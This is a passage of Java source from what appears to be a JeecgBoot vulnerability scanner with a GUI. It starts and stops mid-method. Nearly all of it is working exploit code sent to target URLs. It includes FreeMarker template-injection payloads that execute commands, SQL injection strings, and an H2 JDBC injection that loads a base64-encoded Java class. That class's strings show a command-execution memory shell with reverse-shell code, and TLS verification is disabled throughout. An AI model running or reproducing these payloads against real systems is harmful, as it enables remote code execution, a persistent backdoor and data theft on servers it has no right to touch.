                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };
            TrustManager[] trustAllCerts = new TrustManager[]{new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            Random random = new Random();
            int randomNumber = random.nextInt(100);
            URL url1 = new URL(url + "/jmreport/queryFieldBySql");
            String json = "{\"sql\":\"select '<#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()> ${ ex(\\\"echo 86756755\\\") }' \"}";
            HttpURLConnection connection = (HttpURLConnection)url1.openConnection();
            connection.setRequestProperty(
                    "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool"
            );
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream());
            writer.write(json);
            writer.close();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            int responseCode = connection.getResponseCode();
            if (response.toString().contains("86756755")) {
                output.appendText(formattedDateTime + url + "[+]可能存在jeect-boot queryFieldBySql远程命令执行漏洞\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + url + "[-]不存在jeect-boot queryFieldBySql远程命令执行漏洞-\n");
        }
    }

    public void zidingyi1(String url, TextArea output) {
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1);
        }

        try {
            HostnameVerifier hv = new HostnameVerifier() {
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };
            TrustManager[] trustAllCerts = new TrustManager[]{new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            Random random = new Random();
            int randomNumber = random.nextInt(100);
            URL url1 = new URL(url + "/jmreport/testConnection");
            String json = "{\n          \"id\":\"1\",\n          \"code\":\"ABC\",\n          \"dbType\":\"MySQL\",\n          \"dbDriver\":\"org.h2.Driver\",\n          \"dbUrl\":\"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'void shellexec(String b) throws Exception {byte[] bytes\\\\;try{bytes=java.util.Base64.getDecoder().decode(b)\\\\;}catch (Exception e){e.printStackTrace()\\\\;bytes=javax.xml.bind.DatatypeConverter.parseBase64Binary(b)\\\\;}java.lang.reflect.Method defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(\\\\\\\"defineClass\\\\\\\", byte[].class,int.class,int.class)\\\\;defineClassMethod.setAccessible(true)\\\\;Class clz=(Class)defineClassMethod.invoke(new javax.management.loading.MLet(new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()), bytes, 0,bytes.length)\\\\;clz.newInstance()\\\\;}'\\\\;CALL EXEC('yv66vgAAADEBawoAHQCSCgBEAJMKAEQAlAoAHQCVCACWCgAbAJcKAJgAmQoAmACaBwCbCgBEAJwIAIwKACAAnQgAnggAnwcAoAgAoQgAogcAowoAGwCkCAClCACmBwCnCwAWAKgLABYAqQgAqggAqwcArAoAGwCtBwCuCgCvALAIALEHALIIALMKAH4AtAoAIAC1CAC2CQAmALcHALgKACYAuQgAugoAfgC7CgAbALwIAL0HAL4KABsAvwgAwAcAwQgAwggAwwoAGwDEBwDFCgBEAMYKAMcAuwgAyAoAIADJCADKCgAgAMsIAMwKACAAzQoAIADOCADPCgAgANAIANEJAH4A0goAJgDTCgAmANQJAH4A1QcA1goARADXCgBEANgIAI0IANkKAH4A2ggA2woA3ADdCgAgAN4IAN8IAOAIAOEHAOIKAFAAkgoAUADjCADkCgBQAOUIAOYIAOcIAOgIAOkKAOoA6woA6gDsBwDtCgDuAO8KAFsA8AgA8QoAWwDyCgBbAPMKAFsA9AoA7gD1CgDuAPYKAC8A5QgA9woAIAD4CAD5CgDqAPoHAPsKACYA/AoAaQD9CgBpAO8KAO4A/goAaQD+CgBpAP8KAQABAQoBAAECCgEDAQQKAQMBBQUAAAAAAAAAMgoARAEGCgDuAQcKAGkBCAgBCQoALwEKCAELCAEMCgB+AQ0HAQ4BAAJpcAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHBvcnQBABNMamF2YS9sYW5nL0ludGVnZXI7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAHZXhlY3V0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAEZXhlYwEAB3JldmVyc2UBADkoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9JbnRlZ2VyOylMamF2YS9sYW5nL1N0cmluZzsBAANydW4BAApTb3VyY2VGaWxlAQAHQTQuamF2YQwAgwCEDAEPARAMAREBEgwBEwEUAQAHdGhyZWFkcwwBFQEWBwEXDAEYARkMARoBGwEAE1tMamF2YS9sYW5nL1RocmVhZDsMARwBHQwBHgEfAQAEaHR0cAEABnRhcmdldAEAEmphdmEvbGFuZy9SdW5uYWJsZQEABnRoaXMkMAEAB2hhbmRsZXIBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24MASABFAEABmdsb2JhbAEACnByb2Nlc3NvcnMBAA5qYXZhL3V0aWwvTGlzdAwBIQEiDAEaASMBAANyZXEBAAtnZXRSZXNwb25zZQEAD2phdmEvbGFuZy9DbGFzcwwBJAElAQAQamF2YS9sYW5nL09iamVjdAcBJgwBJwEoAQAJZ2V0SGVhZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAA2NtZAwAigCLDAEpASoBAAlzZXRTdGF0dXMMASsBLAEAEWphdmEvbGFuZy9JbnRlZ2VyDACDAS0BACRvcmcuYXBhY2hlLnRvbWNhdC51dGlsLmJ1Zi5CeXRlQ2h1bmsMAIgAiQwBLgEvAQAIc2V0Qnl0ZXMBAAJbQgwBMAElAQAHZG9Xcml0ZQEAE2phdmEvbGFuZy9FeGNlcHRpb24BABNqYXZhLm5pby5CeXRlQnVmZmVyAQAEd3JhcAwBMQCJAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24MATIBMwcBNAEAAAwBNQE2AQAQY29tbWFuZCBub3QgbnVsbAwBNwEdAQAFIyMjIyMMATgBOQwBOgE7AQABOgwBPAE9AQAiY29tbWFuZCByZXZlcnNlIGhvc3QgZm9ybWF0IGVycm9yIQwAfwCADAE+AT8MAUABQQwAgQCCAQAQamF2YS9sYW5nL1RocmVhZAwAgwFCDAFDAIQBAAVAQEBAQAwAjACLAQAHb3MubmFtZQcBRAwBRQCLDAFGAR0BAAN3aW4BAARwaW5nAQACLW4BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBRwFIAQAFIC1uIDQMAUkBHQEAAi9jAQAFIC10IDQBAAJzaAEAAi1jBwFKDAFLAUwMAIwBTQEAEWphdmEvdXRpbC9TY2FubmVyBwFODAFPAVAMAIMBUQEAAlxhDAFSAVMMAVQBVQwBVgEdDAFXAVAMAVgAhAEABy9iaW4vc2gMAIMBWQEAB2NtZC5leGUMAIwBWgEAD2phdmEvbmV0L1NvY2tldAwBWwEiDACDAVwMAV0BXgwBXwFVBwFgDAFhASIMAWIBIgcBYwwBZAEtDAFlAIQMAWYBZwwBaAEiDAFpAIQBAB1yZXZlcnNlIGV4ZWN1dGUgZXJyb3IsIG1zZyAtPgwBagEdAQABIQEAE3JldmVyc2UgZXhlY3V0ZSBvayEMAI0AjgEAAkE0AQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQANZ2V0U3VwZXJjbGFzcwEABHNpemUBAAMoKUkBABUoSSlMamF2YS9sYW5nL09iamVjdDsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5uZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACmdldEJ5dGVzAQAQKClbQgEABFRZUEUBAARqYXZhL2xhbmcvQ2xhc3M7AQAEKEkpVgEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBABFnZXREZWNsYXJlZE1ldGhvZAEAB2Zvck5hbWUBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAEdHJpbQEACnN0YXJ0c1dpdGgBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBAAdyZXBsYWNlAQBEKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylMamF2YS9sYW5nL1N0cmluZzsBAAVzcGxpdAEAJyhMamF2YS9sYW5nL1N0cmluZzspW0xqYXZhL2xhbmcvU3RyaW5nOwEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBABcoTGphdmEvbGFuZy9SdW5uYWJsZTspVgEABXN0YXJ0AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEADmdldEVycm9yU3RyZWFtAQAHZGVzdHJveQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEACmludFZhbHVlAQAWKExqYXZhL2xhbmcvU3RyaW5nO0kpVgEAD2dldE91dHB1dFN0cmVhbQEAGCgpTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEACGlzQ2xvc2VkAQATamF2YS9pby9J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')\",\n          \"dbName\":\"383BAb7deFC825E6\",\n          \"dbPassword\":\"917982\",\n          \"userName\":\"917982\"\n        }";
            HttpURLConnection connection = (HttpURLConnection)url1.openConnection();
            connection.setRequestProperty(
                    "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool"
            );
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("cmd", "echo 7868765756767");
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            if (response.toString().contains("7868765756767")) {
                output.appendText(formattedDateTime + url + "[+++]可能存在jeect-boot testConnection远程命令执行漏洞\n");
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeect-boot testConnection远程命令执行漏洞\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + url + "[-]不存在jeect-boot testConnection远程命令执行漏洞-\n");
        }
    }

    public void zidingyi3(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            String params = "{\"sql\":\"select '<#assign value=\\\"freemarker.template.utility.Execute\\\"?new()>${value(\\\"echo 888888\\\")}'\"}";
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            OkHttpClient client = new OkHttpClient.Builder()
                    .sslSocketFactory(NetworkUtils.getIgnoreInitedSslContext().getSocketFactory(), NetworkUtils.IGNORE_SSL_TRUST_MANAGER_X509)
                    .hostnameVerifier(NetworkUtils.getIgnoreSslHostnameVerifier())
                    .build();
            RequestBody requestBody = RequestBody.create(MediaType.parse("application/json"), params);
            Request request = new Request.Builder().url(url + "/jmreport/loadTableData").post(requestBody).build();
            Response response = client.newCall(request).execute();
            String responseBody = response.body().string();
            if (responseBody.contains("888888")) {
                output.appendText(formattedDateTime + url + "[+++]存在JeecgBoot jmreport/loadTableData SSTI模板注入漏洞\n");
                output.appendText(response.toString());
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在JeecgBoot jmreport/loadTableData SSTI模板注入漏洞\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在JeecgBoot jmreport/loadTableData SSTI模板注入漏洞-\n");
        }
    }

    public void zidingyi4(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            String params = "{\"apiSelectId\":\"1316997232402231298\",\"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or '%%' like '\"}";
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            OkHttpClient client = new OkHttpClient.Builder()
                    .sslSocketFactory(NetworkUtils.getIgnoreInitedSslContext().getSocketFactory(), NetworkUtils.IGNORE_SSL_TRUST_MANAGER_X509)
                    .hostnameVerifier(NetworkUtils.getIgnoreSslHostnameVerifier())
                    .build();
            RequestBody requestBody = RequestBody.create(MediaType.parse("application/json"), params);
            Request request = new Request.Builder().url(url + "/jmreport/qurestSql").post(requestBody).build();
            Response response = client.newCall(request).execute();
            String responseBody = response.body().string();
            if (responseBody.contains("e10adc3949ba59abbe56e057f20f883e")) {
                output.appendText(formattedDateTime + url + "[+++]存在jeecg-boot-queryTableData-sqli注入漏洞\n");
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-queryTableData-sqli注入漏洞\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在jeecg-boot-queryTableData-sqli注入漏洞-\n");
        }
    }

    public void zidingyi5(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            String params = "{\"apiSelectId\":\"1316997232402231298\",\"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(jeecg))),1)) or '%%' like '\"}";
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            OkHttpClient client = new OkHttpClient.Builder()
                    .sslSocketFactory(NetworkUtils.getIgnoreInitedSslContext().getSocketFactory(), NetworkUtils.IGNORE_SSL_TRUST_MANAGER_X509)
                    .hostnameVerifier(NetworkUtils.getIgnoreSslHostnameVerifier())
                    .build();
            Request request = new Request.Builder()
                    .url(url + "/sys/ng-alain/getDictItemsByTable/' from sys_user/*, '/x.js")
                    .build();
            Response response = client.newCall(request).execute();
            String responseBody = response.body().string();
            if (responseBody.contains("create_by")) {
                output.appendText(formattedDateTime + url + "[+++]存在jeecg-boot-getDictItemsByTable-sqli注入漏洞\n");
                output.appendText(url + "/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js\n");
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-getDictItemsByTable-sqli注入漏洞\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在jeecg-boot-getDictItemsByTable-sqli注入漏洞-\n");
        }
    }



    public void jeecgpl(String line, TextArea output) {
        try {
            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            Random random = new Random();
            int randomNumber = random.nextInt(100);
            URL url1 = new URL(line + "/jmreport/testConnection");
            String json = "{\"id\":\"1\",\"code\":\"ABC\",\"dbType\":\"MySQL\",\"dbDriver\":\"org.h2.Driver\",\"dbUrl\":\"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'void shellexec(String b) throws Exception {byte[] bytes\\\\;try{bytes=java.util.Base64.getDecoder().decode(b)\\\\;}catch (Exception e){e.printStackTrace()\\\\;bytes=javax.xml.bind.DatatypeConverter.parseBase64Binary(b)\\\\;}java.lang.reflect.Method defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(\\\\\\\"defineClass\\\\\\\", byte[].class,int.class,int.class)\\\\;defineClassMethod.setAccessible(true)\\\\;Class clz=(Class)defineClassMethod.invoke(new javax.management.loading.MLet(new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()), bytes, 0,bytes.length)\\\\;clz.newInstance()\\\\;}'\\\\;CALL EXEC('test')\",\"dbName\":\"383BAb7deFC825E6\",\"dbPassword\":\"917982\",\"userName\":\"917982\"}";
            HttpURLConnection connection = (HttpURLConnection)url1.openConnection();
            connection.setRequestProperty(
                    "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool"
            );
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("cmd", "echo 87685675765");
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            int responseCode = connection.getResponseCode();
            if (response.toString().contains("87685675765")) {
                output.appendText(formattedDateTime + line + "[+++]存在jeect-boot testConnection远程命令执行漏洞\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + line + "[-]不存在jeect-boot testConnection远程命令执行漏洞-\n");
        }
    }

    public void jeecgquery(String line, TextArea output) {
        try {
            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            Random random = new Random();
            int randomNumber = random.nextInt(100);
            URL url1 = new URL(line + "/jeecg-boot/jmreport/queryFieldBySql");
            String json = "{\"sql\":\"select '<#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()> ${ ex(\\\"echo 86756755\\\") }' \"}";
            HttpURLConnection connection = (HttpURLConnection)url1.openConnection();
            connection.setRequestProperty(
                    "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool"
            );
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            if (response.toString().contains("86756755")) {
                output.appendText(formattedDateTime + line + "[+]可能存在jeect-boot queryFieldBySql远程命令执行漏洞\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + line + "[-]不存在jeect-boot queryFieldBySql远程命令执行漏洞-\n");
        }
    }

    public void jeecgsql(String line, TextArea output) {
        try {
